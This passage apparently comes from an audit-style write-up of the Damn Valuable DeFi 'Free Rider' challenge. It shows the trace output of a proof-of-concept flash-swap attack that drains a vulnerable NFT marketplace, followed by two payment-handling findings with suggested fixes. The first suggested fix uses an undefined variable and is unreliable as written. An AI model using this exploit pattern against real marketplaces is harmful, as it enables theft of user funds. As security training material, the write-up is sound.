    │   │   │   ├─ [0] console::log("Paying back amount of WETH to uniswap", 15045135406218655968 [1.504e19]) [staticcall]
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [24345] WETH::deposit{value: 15045135406218655968}()
    │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 15045135406218655968 [1.504e19])
    │   │   │   │   ├─ emit Deposit(from: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 15045135406218655968 [1.504e19])
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [25102] WETH::approve(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, 15045135406218655968 [1.504e19])
    │   │   │   │   ├─ emit Approval(owner: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], spender: 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, amount: 15045135406218655968 [1.504e19])
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ [3607] WETH::transfer(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, 15045135406218655968 [1.504e19])
    │   │   │   │   ├─ emit Transfer(from: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: 0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, amount: 15045135406218655968 [1.504e19])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop]
    │   │   ├─ [825] WETH::balanceOf(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190) [staticcall]
    │   │   │   └─ ← [Return] 9000045135406218655968 [9e21]
    │   │   ├─ [2802] DamnValuableToken::balanceOf(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190) [staticcall]
    │   │   │   └─ ← [Return] 15000000000000000000000 [1.5e22]
    │   │   ├─ emit Sync(reserve0: 9000045135406218655968 [9e21], reserve1: 15000000000000000000000 [1.5e22])
    │   │   ├─ emit Swap(sender: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount0In: 15045135406218655968 [1.504e19], amount1In: 0, amount0Out: 15000000000000000000 [1.5e19], amount1Out: 0, to: FreeRider: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   └─ ← [Stop]
    │   ├─ [0] player::00000000{value: 119954864593781344032}(00000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000d796f7520646964206974203b2900000000000000000000000000000000000000)
    │   │   └─ ← [Stop]
    │   ├─ [0] console::log("Player call result:", true) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [0] console::log("Final player balance", 120054864593781344032 [1.2e20]) [staticcall]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [29235] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 0)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 0)
    │   └─ ← [Stop]
    ├─ [1051] DamnValuableNFT::ownerOf(0) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 1)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 1)
    │   └─ ← [Stop]
    ├─ [1051] DamnValuableNFT::ownerOf(1) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 2)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 2)
    │   └─ ← [Stop]
    ├─ [1051] DamnValuableNFT::ownerOf(2) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 3)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 3)
    │   └─ ← [Stop]
    ├─ [1051] DamnValuableNFT::ownerOf(3) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 4)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 4)
    │   └─ ← [Stop]
    ├─ [1051] DamnValuableNFT::ownerOf(4) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])
    │   └─ ← [Return]
    ├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], 5)
    │   ├─ emit Transfer(from: FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], to: recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], tokenId: 5)
    │   └─ ← [Stop]
    ├─ [1051] DamnValuableNFT::ownerOf(5) [staticcall]
    │   └─ ← [Return] recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]
    ├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA]) [staticcall]
    │   └─ ← [Return]
    ├─ [425] FreeRiderNFTMarketplace::offersCount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertLt(15000000000000000000 [1.5e19], 90000000000000000000 [9e19]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertGt(120054864593781344032 [1.2e20], 45000000000000000000 [4.5e19]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 16.95ms (6.51ms CPU time)
```

</details>


**Recommended Mitigation:** Add a require statement that checks that the `msg.value` equals the number of tokens multiplied by the price of each token bought.

```diff
function buyMany(
    uint256[] calldata tokenIds
) external payable nonReentrant {
    // note: this assumes that all tokenIds have the same price - adapt if needed
+   uint256 priceToPayPerToken = offers[tokenId];
+   require(msg.value == tokenIds.length * priceToPayPerToken, "Incorrect payment amount");
    for (uint256 i = 0; i < tokenIds.length; ++i) {
        unchecked {
            _buyOne(tokenIds[i]);
        }
    }
}
```

## [H-2] The `_buyOne` function of `FreeRiderNFTMarketplace.sol` misshandle the paiment of the NFT bought, sending money to the buyer instead of the seller.

**Description**: The `_buyOne` function of `FreeRiderNFTMarketplace.sol` does not correctly handle the payment for the NFT bought. Instead of sending the payment to the seller, it sends it to the buyer, which is not the intended behavior.

```javascript
function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId];
    if (priceToPay == 0) {
        revert TokenNotOffered(tokenId);
    }

    if (msg.value < priceToPay) {
        revert InsufficientPayment();
    }

    --offersCount;

    // transfer from seller to buyer
    DamnValuableNFT _token = token; // cache for gas savings
    _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

    // $audit-high: paying owner once token has been transfered --> paying the buyer instead of the seller
    // pay seller using cached token
@>  payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

    emit NFTBought(msg.sender, tokenId, priceToPay);
}
```

**Impact**: this vulnerability allows an attacker to buy NFTs without actually paying for them, as the `msg.value` sent by the buyer is sent back to the <u>buyer</u> instead of the seller.

**Proof of Code**: the above code can be used to prove that the attacker ends up with more ETH than they started with, as they receive the payment for the NFT bought.

**Recommended Mitigation**: first send the price paid to the original NFT owner, then transfer the NFT.

```diff
function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId];
    if (priceToPay == 0) {
        revert TokenNotOffered(tokenId);
    }

    if (msg.value < priceToPay) {
        revert InsufficientPayment();
    }

    --offersCount;

    // transfer from seller to buyer
    DamnValuableNFT _token = token; // cache for gas savings

+   // pay seller using cached token
+   payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

    _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

-   // pay seller using cached token
-   payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

    emit NFTBought(msg.sender, tokenId, priceToPay);
}
```
